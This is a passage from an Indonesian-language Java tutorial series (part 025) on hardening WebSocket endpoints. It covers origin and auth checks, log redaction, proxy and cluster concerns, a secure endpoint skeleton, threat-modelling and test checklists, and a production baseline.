- SSO sering butuh `SameSite=None; Secure`,
- WebSocket CSWSH tetap harus dicegah dengan origin check.

Policy umum:

```text
Same-site app biasa:
  Secure; HttpOnly; SameSite=Lax atau Strict sesuai UX

Cross-site SSO/embedded scenario:
  Secure; HttpOnly; SameSite=None
  + very strict Origin allowlist
  + explicit handshake nonce/token
```

---

## 24. TLS dan Mixed Content

Gunakan:

```text
wss:// untuk production
```

Jangan:

```text
ws:// pada halaman https://
```

Browser modern biasanya memblok mixed active content. Namun lebih penting, tanpa TLS:

- handshake bisa disadap,
- message bisa disadap,
- token/cookie bisa bocor jika tidak Secure,
- intermediary bisa memodifikasi traffic.

Jika TLS termination di load balancer/proxy:

```text
Browser --TLS--> LB/Proxy --plain/internal--> App
```

Pastikan:

- internal network trusted atau pakai TLS sampai app,
- `X-Forwarded-Proto`/`Forwarded` benar,
- cookie Secure tetap diset karena external scheme HTTPS,
- app tidak membuat redirect `ws://` karena salah scheme.

---

## 25. Sensitive Data di URL, Header, dan Log

Jangan menaruh data sensitif di:

```text
URL path
query string
subprotocol string
close reason detail
error message detail
access log
application log
```

Buruk:

```text
wss://app.example.com/ws/case/SECRET-CASE-ID?token=long-lived-token
```

Lebih aman:

```text
wss://app.example.com/ws
```

Lalu message:

```json
{
  "type": "SUBSCRIBE_CASE",
  "payload": { "caseId": "CASE-2026-000123" }
}
```

Tetap validasi dan audit.

Log harus redacted:

```text
Authorization: <redacted>
Cookie: <redacted>
access_token: <redacted>
message.payload.documentText: <redacted or hashed>
```

---

## 26. Close Codes untuk Security

Gunakan close reason secukupnya. Jangan bocorkan detail policy.

Close code yang sering relevan:

```text
1000 NORMAL_CLOSURE
1002 PROTOCOL_ERROR
1003 CANNOT_ACCEPT
1007 NOT_CONSISTENT
1008 VIOLATED_POLICY
1009 TOO_BIG
1011 UNEXPECTED_CONDITION
```

Contoh:

```java
session.close(new CloseReason(
    CloseReason.CloseCodes.VIOLATED_POLICY,
    "Policy violation"
));
```

Jangan:

```text
"User lacks CASE_ADMIN role for tenant agency-b case 123 because assignment revoked"
```

Detail itu masuk audit internal, bukan close reason ke client.

---

## 27. Security Headers dan WebSocket

Beberapa HTTP security header tetap relevan untuk page/app yang membuka WebSocket, walaupun bukan pada frame WebSocket itu sendiri.

Misalnya:

```text
Content-Security-Policy: connect-src 'self' wss://app.example.com
```

CSP `connect-src` membatasi destination WebSocket/fetch/EventSource dari halaman.

Contoh:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' wss://app.example.com
```

Namun CSP adalah defense di browser. Server tetap harus validate origin dan auth.

Header lain:

```text
Strict-Transport-Security
X-Content-Type-Options
Referrer-Policy
Permissions-Policy
```

Relevan untuk web app keseluruhan, bukan pengganti WebSocket security.

---

## 28. Compression dan WebSocket Security

WebSocket extension seperti `permessage-deflate` bisa mengurangi bandwidth, tetapi punya trade-off:

- CPU cost,
- memory overhead,
- compression side-channel risk pada data rahasia,
- compression bomb-like behavior jika tidak dibatasi,
- slow client/backpressure lebih kompleks.

Untuk data sensitif yang dicampur dengan attacker-controlled content, compression harus dipertimbangkan hati-hati.

Praktik aman:

```text
Disable compression by default untuk high-sensitivity channel.
Enable hanya jika ada kebutuhan bandwidth jelas dan risiko sudah dinilai.
Tetapkan payload limit sebelum dan sesudah decompression.
Monitor CPU dan memory.
```

---

## 29. WebSocket di Belakang Reverse Proxy

Proxy/LB harus mengizinkan upgrade:

```http
Upgrade: websocket
Connection: Upgrade
```

Security settings di proxy:

```text
TLS policy
allowed host
body/header size
idle timeout
connection limit
rate limit handshake
origin/header forwarding policy
access log redaction
```

Common mistake:

```text
App validate Origin app.example.com,
proxy menerima Host apa pun,
attacker pakai Host header injection / misrouted traffic.
```

Pastikan:

- Host allowlist di edge,
- Origin allowlist di app,
- forwarded headers dipercaya hanya dari proxy internal,
- direct access ke app pod/container ditutup,
- proxy timeout aligned dengan heartbeat.

---

## 30. Kubernetes/Cluster Security Considerations

Dalam cluster:

```text
Node A punya koneksi user 1
Node B menerima logout event
Node C publish case event
```

Security state harus disinkronkan.

Perlu desain untuk:

- distributed connection registry atau node-local registry + broker event,
- revocation broadcast,
- per-tenant/user quota cluster-wide,
- sticky session jika perlu,
- graceful drain saat pod terminating,
- not sending event to stale subscription,
- close sessions on deployment if protocol version changes.

### 30.1 Rolling Update

Saat pod menerima SIGTERM:

```text
1. readiness false
2. stop accepting new WS connection
3. notify clients server draining
4. optionally close with reason retry/reconnect
5. wait short drain period
6. force close remaining sessions
```

Security angle:

- jangan biarkan old binary dengan old authorization rule hidup terlalu lama,
- close connections saat security-critical deployment,
- version negotiation untuk message schema.

---

## 31. Endpoint Versioning dan Schema Security

WebSocket connection long-lived berarti client/server schema mismatch lebih mungkin terjadi saat deployment.

Gunakan:

```text
endpoint version: /ws/v1
message version field
server supported version list
explicit unsupported-version error
forced reconnect on breaking change
```

Contoh handshake path:

```text
/ws/v1/case-events
/ws/v2/case-events
```

Message:

```json
{
  "version": 1,
  "type": "CASE_SUBSCRIBE",
  "payload": { ... }
}
```

Security relevance:

- old client mungkin tidak mengirim field baru yang wajib untuk authorization,
- old client mungkin interpret event salah,
- server harus reject unknown/unsupported versions safely.

---

## 32. Secure Endpoint Skeleton

Berikut skeleton konseptual untuk endpoint yang lebih aman. Ini bukan framework lengkap, tetapi menunjukkan boundary.

```java
package com.example.ws;

import com.example.ws.security.AuthContext;
import com.example.ws.security.AuthorizationService;
import com.example.ws.security.ConnectionRegistry;
import com.example.ws.security.MessageValidator;
import com.example.ws.security.RateLimiter;
import com.example.ws.security.WsMessage;
import jakarta.websocket.CloseReason;
import jakarta.websocket.OnClose;
import jakarta.websocket.OnError;
import jakarta.websocket.OnMessage;
import jakarta.websocket.OnOpen;
import jakarta.websocket.Session;
import jakarta.websocket.server.ServerEndpoint;

import java.time.Instant;
import java.util.UUID;

@ServerEndpoint(
    value = "/ws/case-events",
    configurator = SecureWsConfigurator.class
)
public class CaseEventsEndpoint {

    private static final int MAX_TEXT_BYTES = 64 * 1024;

    private static final ConnectionRegistry registry = AppComponents.connectionRegistry();
    private static final AuthorizationService authorization = AppComponents.authorizationService();
    private static final MessageValidator validator = AppComponents.messageValidator();
    private static final RateLimiter rateLimiter = AppComponents.rateLimiter();

    @OnOpen
    public void onOpen(Session session) throws Exception {
        session.setMaxTextMessageBufferSize(MAX_TEXT_BYTES);

        AuthContext auth = AuthContext.fromHandshake(session.getUserProperties());
        if (!auth.isAuthenticated()) {
            close(session, CloseReason.CloseCodes.VIOLATED_POLICY, "Authentication required");
            return;
        }

        if (!rateLimiter.allowConnection(auth.userId(), auth.remoteIp())) {
            close(session, CloseReason.CloseCodes.VIOLATED_POLICY, "Connection limit exceeded");
            return;
        }

        String connectionId = UUID.randomUUID().toString();
        session.getUserProperties().put("connectionId", connectionId);
        session.getUserProperties().put("auth", auth);
        session.getUserProperties().put("openedAt", Instant.now());

        registry.register(connectionId, session, auth);
    }

    @OnMessage
    public void onMessage(String raw, Session session) throws Exception {
        String connectionId = (String) session.getUserProperties().get("connectionId");
        AuthContext auth = (AuthContext) session.getUserProperties().get("auth");

        if (connectionId == null || auth == null) {
            close(session, CloseReason.CloseCodes.VIOLATED_POLICY, "Invalid connection state");
            return;
        }

        if (!auth.isStillValid()) {
            close(session, CloseReason.CloseCodes.VIOLATED_POLICY, "Authentication expired");
            return;
        }

        if (!rateLimiter.allowMessage(auth.userId(), connectionId, raw.length())) {
            close(session, CloseReason.CloseCodes.VIOLATED_POLICY, "Rate limit exceeded");
            return;
        }

        WsMessage message = validator.parseAndValidate(raw);

        switch (message.type()) {
            case "SUBSCRIBE_CASE" -> {
                String caseId = message.payload().requiredString("caseId");
                authorization.checkSubscribeCase(auth, caseId);
                registry.subscribe(connectionId, "case:" + caseId);
                sendAck(session, message.id());
            }
            case "UNSUBSCRIBE_CASE" -> {
                String caseId = message.payload().requiredString("caseId");
                registry.unsubscribe(connectionId, "case:" + caseId);
                sendAck(session, message.id());
            }
            case "PING" -> {
                sendPong(session, message.id());
            }
            default -> {
                auditDenied(auth, connectionId, message, "unknown_type");
                close(session, CloseReason.CloseCodes.CANNOT_ACCEPT, "Unsupported message type");
            }
        }
    }

    @OnClose
    public void onClose(Session session, CloseReason reason) {
        String connectionId = (String) session.getUserProperties().get("connectionId");
        if (connectionId != null) {
            registry.unregister(connectionId, reason);
        }
    }

    @OnError
    public void onError(Session session, Throwable error) {
        String connectionId = session == null
            ? null
            : (String) session.getUserProperties().get("connectionId");
        auditError(connectionId, error);
    }

    private void close(Session session, CloseReason.CloseCode code, String reason) throws Exception {
        if (session != null && session.isOpen()) {
            session.close(new CloseReason(code, reason));
        }
    }

    private void sendAck(Session session, String messageId) {
        // Use safe bounded send queue in production.
    }

    private void sendPong(Session session, String messageId) {
        // App-level pong if needed.
    }

    private void auditDenied(AuthContext auth, String connectionId, WsMessage message, String reason) {
        // Redact payload.
    }

    private void auditError(String connectionId, Throwable error) {
        // Avoid logging sensitive payload.
    }
}
```

Yang sengaja terlihat di skeleton:

- origin/auth dilakukan di configurator,
- `@OnOpen` tetap enforce authenticated state,
- payload size dibatasi,
- connection quota dicek,
- auth context disimpan eksplisit,
- message rate limit dicek,
- schema validation dilakukan sebelum dispatch,
- authorization dilakukan per subscription/action,
- registry cleanup pada close,
- audit error tanpa payload sensitif.

---

## 33. Secure Configurator Skeleton

```java
package com.example.ws;

import com.example.ws.security.AuthContext;
import com.example.ws.security.Authenticator;
import jakarta.websocket.HandshakeResponse;
import jakarta.websocket.server.HandshakeRequest;
import jakarta.websocket.server.ServerEndpointConfig;

import java.util.List;
import java.util.Map;
import java.util.Set;

public class SecureWsConfigurator extends ServerEndpointConfig.Configurator {

    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://app.example.com",
        "https://admin.example.com"
    );

    private static final Authenticator authenticator = AppComponents.authenticator();

    @Override
    public boolean checkOrigin(String originHeaderValue) {
        return originHeaderValue != null
            && ALLOWED_ORIGINS.contains(originHeaderValue);
    }

    @Override
    public void modifyHandshake(
        ServerEndpointConfig config,
        HandshakeRequest request,
        HandshakeResponse response
    ) {
        Map<String, List<String>> headers = request.getHeaders();

        AuthContext auth = authenticator.authenticateHandshake(
            request.getUserPrincipal(),
            headers,
            request.getRequestURI(),
            request.getHttpSession()
        );

        config.getUserProperties().put("auth.context", auth);
        config.getUserProperties().put("origin", first(headers, "Origin"));
        config.getUserProperties().put("remote.ip", deriveRemoteIp(headers));
    }

    private String first(Map<String, List<String>> headers, String name) {
        List<String> values = headers.get(name);
        return values == null || values.isEmpty() ? null : values.get(0);
    }

    private String deriveRemoteIp(Map<String, List<String>> headers) {
        // Only trust forwarded headers if request came from trusted proxy.
        return "unknown";
    }
}
```

Important caveat:

```text
Jangan percaya X-Forwarded-For dari internet langsung.
Hanya percaya forwarded headers yang ditambahkan oleh trusted proxy dan direct pod/app access harus ditutup.
```

---

## 34. Security Event Audit Model

WebSocket security butuh audit yang berbeda dari HTTP access log.

HTTP access log mungkin hanya mencatat handshake:

```text
GET /ws 101
```

Itu tidak cukup.

Audit WebSocket perlu event internal:

```text
WS_CONNECT_ATTEMPT
WS_CONNECT_ACCEPTED
WS_CONNECT_REJECTED
WS_AUTH_EXPIRED
WS_MESSAGE_ACCEPTED
WS_MESSAGE_REJECTED_SCHEMA
WS_MESSAGE_REJECTED_AUTHZ
WS_SUBSCRIBE_ACCEPTED
WS_SUBSCRIBE_REJECTED
WS_RATE_LIMITED
WS_SLOW_CONSUMER_CLOSED
WS_REVOKED
WS_CLOSED
```

Field audit minimal:

```text
timestamp
connectionId
userId/sessionId/tenantId if known
endpoint
origin
remoteIp
userAgent if useful
messageId
messageType
resourceType/resourceId
result
reason code
close code
node/pod id
correlation id
```

Jangan log payload mentah yang mengandung PII/sensitive content.

### 34.1 Audit Reason Code

Gunakan reason code stabil:

```text
origin_not_allowed
auth_missing
auth_expired
connection_limit_exceeded
payload_too_large
schema_invalid
message_type_unknown
subscription_denied
resource_access_denied
rate_limit_exceeded
slow_consumer
revoked
server_draining
```

Ini lebih baik daripada log string bebas.

---

## 35. Threat Modelling Checklist

Gunakan pertanyaan ini sebelum membuka endpoint WebSocket baru.

### 35.1 Connection Threats

```text
Siapa boleh connect?
Dari origin mana?
Apakah endpoint publik atau internal?
Apakah TLS wajib?
Apakah cookie dikirim otomatis?
Apakah CSWSH dicegah?
Berapa max connection per user/IP/tenant/node?
Berapa lama unauthenticated connection boleh hidup?
Apa yang terjadi saat auth expired?
Apa yang terjadi saat logout?
Apa yang terjadi saat account disabled?
```

### 35.2 Message Threats

```text
Apa message type yang allowed?
Apakah schema ketat?
Apakah unknown field diterima atau ditolak?
Berapa max payload size?
Apakah message bisa mutate state?
Apakah perlu idempotency key?
Apakah command bisa replay?
Apakah ordering penting?
Apakah per-message authorization dilakukan?
Apakah resource id dari client dipercaya?
```

### 35.3 Subscription Threats

```text
Apakah client bisa subscribe arbitrary topic?
Apakah topic enumerable?
Apakah subscription punya TTL?
Apakah permission dicek ulang saat permission berubah?
Apakah event outbound difilter?
Apakah tenant boundary enforced?
```

### 35.4 Resource Threats

```text
Apa yang terjadi jika client lambat?
Apa max outbound queue?
Apa policy saat queue penuh?
Apa rate limit inbound?
Apa limit bytes/sec?
Apa limit failed authz?
Apakah compression enabled?
Apakah binary accepted?
```

### 35.5 Operational Threats

```text
Bagaimana rolling update menutup koneksi?
Bagaimana revocation broadcast antar node?
Bagaimana audit membuktikan action user?
Bagaimana mendeteksi reconnect storm?
Bagaimana mendeteksi CSWSH attempt?
Bagaimana mendeteksi brute-force subscription?
Bagaimana incident response menutup semua koneksi user tertentu?
```

---

## 36. Common Vulnerability Patterns

### 36.1 Missing Origin Check

Symptom:

```text
Any website can open WebSocket using victim cookie.
```

Fix:

```text
Strict Origin allowlist.
```

### 36.2 Auth Only at Connect, No Message Authz

Symptom:

```text
Authenticated user can access other user's resources by changing id in message.
```

Fix:

```text
Per-message authorization based on authenticated identity and resource.
```

### 36.3 Trusting Client Topic

Symptom:

```text
User subscribes to admin topic or other tenant topic.
```

Fix:

```text
Server parses and authorizes topic; prefer server-derived topics.
```

### 36.4 Unbounded Outbound Queue

Symptom:

```text
Slow client causes heap growth and OOM.
```

Fix:

```text
Bounded queue + slow consumer close/drop/coalesce policy.
```

### 36.5 Token in URL with Long TTL

Symptom:

```text
Access token leaks in logs and can be replayed.
```

Fix:

```text
Avoid URL token; if unavoidable use short-lived scoped one-time WebSocket token and redact logs.
```

### 36.6 No Payload Limit

Symptom:

```text
Large frame causes memory pressure.
```

Fix:

```text
Container/session/application payload limit.
```

### 36.7 Stale Permission

Symptom:

```text
User keeps receiving event after role revoked.
```

Fix:

```text
Revocation event + auth lease + revalidation for sensitive outbound.
```

### 36.8 Logging Sensitive Message

Symptom:

```text
PII, tokens, internal notes in application logs.
```

Fix:

```text
Structured audit with redaction and stable reason codes.
```

---

## 37. Testing WebSocket Security

Security tests should cover more than happy path.

### 37.1 Origin Tests

```text
Origin https://app.example.com -> accepted
Origin https://admin.example.com -> accepted if allowed
Origin https://evil.example -> rejected
Origin https://app.example.com.evil -> rejected
Origin null -> rejected by default
Missing Origin -> rejected for browser endpoint
```

### 37.2 Authentication Tests

```text
No cookie/token -> rejected/closed
Expired token -> rejected/closed
Valid token -> accepted
Token for user B on existing user A connection refresh -> closed
Logout closes active connection
Revoked account closes active connection
```

### 37.3 Authorization Tests

```text
User can subscribe own case -> accepted
User subscribes other case -> denied
User subscribes other tenant -> denied
Role revoked after subscribe -> event no longer delivered
Failed authz repeated -> connection closed
```

### 37.4 Input Tests

```text
Unknown message type -> rejected
Missing required field -> rejected
Extra dangerous field -> rejected or ignored based on policy
Invalid JSON -> rejected/closed
Payload > limit -> closed 1009/policy
Deep JSON -> rejected
Binary when not supported -> rejected
```

### 37.5 Rate/Resource Tests

```text
Too many connections per user -> reject
Too many messages/sec -> close
Too many subscriptions -> reject
Slow client -> queue bounded and eventually closed/dropped
Reconnect storm -> rate-limited
```

### 37.6 Proxy Tests

```text
Upgrade works only via allowed host
Direct pod access blocked
X-Forwarded-* spoofing not trusted
LB idle timeout > heartbeat policy
TLS required externally
```

---

## 38. Decision Matrix: Which Auth Pattern?

| Scenario | Recommended Pattern | Notes |
|---|---|---|
| First-party SPA, same domain | HttpOnly session cookie + strict Origin | Strong default for browser app |
| First-party SPA, separate subdomain | Cookie/token + strict Origin + SameSite review | Pay attention to domain/path/SameSite |
| Cross-site embedded app | Explicit handshake nonce/token + strict allowlist | Higher CSWSH risk |
| Public browser API | Short-lived WS token | Avoid long-lived token in URL |
| Backend-to-backend | mTLS + Authorization header/service token | Browser constraints not relevant |
| High-sensitivity admin channel | Short auth lease + revalidation + revocation | Do not rely on handshake only |
| Notification-only low-risk | Cookie/session + Origin + subscription auth | Still need rate/queue limits |
| State mutation commands | Prefer HTTP command + WS event, or strict idempotent WS command | Audit and idempotency required |

---

## 39. Practical Production Baseline

A production-grade Java WebSocket endpoint should have at least:

```text
[ ] wss:// in production
[ ] strict Origin allowlist
[ ] authentication at handshake or first message with timeout
[ ] no long-lived token in URL
[ ] connection limit per IP/user/tenant
[ ] max payload size
[ ] schema validation
[ ] explicit message type allowlist
[ ] per-message authorization
[ ] subscription authorization
[ ] outbound authorization strategy for sensitive events
[ ] session/token expiry policy
[ ] logout/revocation closes active connections
[ ] inbound message rate limit
[ ] failed authz rate limit
[ ] bounded outbound queue
[ ] slow client policy
[ ] heartbeat/idle timeout alignment
[ ] redacted structured audit
[ ] close reason does not leak details
[ ] proxy upgrade and timeout configured
[ ] rolling update drain behavior
[ ] security tests for origin/auth/authz/rate/payload
```

---

## 40. Mental Model Akhir

WebSocket security bukan “tambahkan token di connect”.

Model yang benar:

```text
WebSocket endpoint adalah long-lived security session.
Ia memiliki lifecycle, identity, authorization lease, resource budget, message grammar, outbound audience, dan revocation semantics.
```

Jika HTTP endpoint biasa adalah:

```text
authorize request -> execute -> finish
```

WebSocket adalah:

```text
authorize connection
  -> maintain authenticated connection state
  -> authorize every meaningful message
  -> authorize every sensitive subscription/outbound event
  -> enforce resource limits continuously
  -> revoke/expire/close correctly
  -> audit lifecycle and message decisions
```

Engineer top-tier melihat WebSocket sebagai kombinasi dari:

```text
protocol boundary
browser boundary
identity boundary
state machine
resource budget
message bus
authorization surface
operational lifecycle
```

Begitu endpoint dibuka, server tidak lagi hanya menangani request. Server sedang memegang koneksi hidup yang bisa menjadi jalur data sensitif, jalur command, jalur DoS, atau bukti audit. Karena itu keamanan WebSocket harus dibangun sebagai desain end-to-end, bukan filter tambahan di pinggir.

---

## 41. Ringkasan

Di bagian ini kita membahas:

- kenapa WebSocket security berbeda dari HTTP biasa,
- handshake sebagai connection gate,
- origin validation dan CSWSH,
- authentication pattern cookie/token/first-message/header/mTLS,
- `ServerEndpointConfig.Configurator`,
- per-message authorization,
- subscription security,
- outbound authorization,
- token/session expiry,
- logout/revocation,
- schema validation,
- payload limit,
- rate limiting,
- connection quota,
- slow client/backpressure,
- replay/idempotency,
- cross-tenant boundary,
- TLS/proxy/Kubernetes concerns,
- audit model,
- vulnerability patterns,
- testing checklist,
- production baseline.

Bagian berikutnya akan membahas **Server-Sent Events, Long Polling, and Streaming Alternatives**. Itu penting karena banyak use case yang sering langsung dipilih WebSocket sebenarnya lebih sederhana, lebih aman, dan lebih murah jika memakai SSE atau polling yang tepat.

---

# Status Seri

Seri **belum selesai**.

Progress saat ini:

```text
Part 025 selesai dari total 031 part.
```

Bagian berikutnya:

```text
Part 026 — Server-Sent Events, Long Polling, and Streaming Alternatives
```

<!-- NAVIGATION_FOOTER -->
---

[⬅️ Sebelumnya: learn-java-servlet-websocket-web-container-runtime — Part 024](./learn-java-servlet-websocket-web-container-runtime-part-024.md) | [🏠 Daftar Isi](../../../index.md) | [Selanjutnya ➡️: learn-java-servlet-websocket-web-container-runtime — Part 026](./learn-java-servlet-websocket-web-container-runtime-part-026.md)
